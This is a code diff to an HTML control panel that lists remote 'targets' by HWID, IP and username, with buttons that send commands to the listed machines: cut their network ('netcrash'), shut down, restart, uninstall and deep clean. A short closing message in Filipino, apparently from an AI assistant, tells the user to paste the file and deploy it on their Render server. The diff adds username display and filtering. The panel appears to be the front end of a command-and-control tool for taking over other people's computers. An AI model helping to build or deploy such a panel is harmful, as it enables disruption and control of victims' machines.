@@ -137,7 +137,7 @@
             </div>
             
             <div class="search-box">
-                <input type="text" id="search-input" placeholder="Filter by HWID or IP address..." onkeyup="filterTargets()">
+                <input type="text" id="search-input" placeholder="Filter by Username, HWID or IP address..." onkeyup="filterTargets()">
             </div>
 
             <div class="global-metrics">
@@ -173,13 +173,14 @@
                     keys.forEach(hwid => {
                         const client = data[hwid];
                         const ip = client.ip || 'Unknown';
+                        const username = client.username || 'Client_Alpha'; // Kukuha na ng dynamic username galing sa server
                         const status = client.status || 'ONLINE';
                         
                         const cardHtml = `
-                            <div class="target-card" data-identifier="client_alpha ${hwid.toLowerCase()} ${ip.toLowerCase()}">
+                            <div class="target-card" data-identifier="${username.toLowerCase()} ${hwid.toLowerCase()} ${ip.toLowerCase()}">
                                 <div class="card-header">
                                     <div class="target-identity">
-                                        <div class="name">Client_Alpha</div>
+                                        <div class="name">${username}</div>
                                         <div class="hwid">HWID: ${hwid}</div>
                                     </div>
                                     <div class="status-badge ${status === 'ONLINE' ? 'status-online' : 'status-offline'}">
@@ -195,24 +196,24 @@
                                 <div class="action-group">
                                     <div class="group-title">Maintenance & Cleanup</div>
                                     <div class="btn-grid">
-                                        <button class="cmd-btn btn-warning" onclick="sendAction('${hwid}', 'uninstall')">⚡ Uninstaller</button>
-                                        <button class="cmd-btn btn-warning" onclick="sendAction('${hwid}', 'clean')">🧹 Deep Clean</button>
+                                        <button class="cmd-btn btn-warning" onclick="sendAction('${hwid}', 'uninstall')">Uninstaller</button>
+                                        <button class="cmd-btn btn-warning" onclick="sendAction('${hwid}', 'deepclean')">Deep Clean</button>
                                     </div>
                                 </div>
 
                                 <div class="action-group">
                                     <div class="group-title">Network Subsystem</div>
                                     <div class="btn-grid">
-                                        <button class="cmd-btn btn-accent" onclick="sendAction('${hwid}', 'netcrash')">🌐 Sever Net</button>
-                                        <button class="cmd-btn" onclick="sendAction('${hwid}', 'netrestore')">🔌 Restore Net</button>
+                                        <button class="cmd-btn btn-accent" onclick="sendAction('${hwid}', 'netcrash')">Sever Net</button>
+                                        <button class="cmd-btn" onclick="sendAction('${hwid}', 'netrestore')">Restore Net</button>
                                     </div>
                                 </div>
 
                                 <div class="action-group">
                                     <div class="group-title">System Power Control</div>
                                     <div class="btn-grid">
-                                        <button class="cmd-btn btn-danger" onclick="sendAction('${hwid}', 'restart')">🔄 Restart</button>
-                                        <button class="cmd-btn btn-danger" onclick="sendAction('${hwid}', 'shutdown')">🛑 Shutdown</button>
+                                        <button class="cmd-btn btn-danger" onclick="sendAction('${hwid}', 'restart')">Restart</button>
+                                        <button class="cmd-btn btn-danger" onclick="sendAction('${hwid}', 'shutdown')">Shutdown</button>
                                     </div>
                                 </div>
 
@@ -272,3 +273,6 @@
     </script>
 </body>
 </html>
+```[cite: 2]
+
+Kopyahin at i-replace mo na lang ito sa iyong `index.html` file, i-deploy o i-save sa server mo (Render), at gagana na nang maayos ang pagpapakita ng username pati na rin ang pag-filter gamit ang search box[cite: 2]!
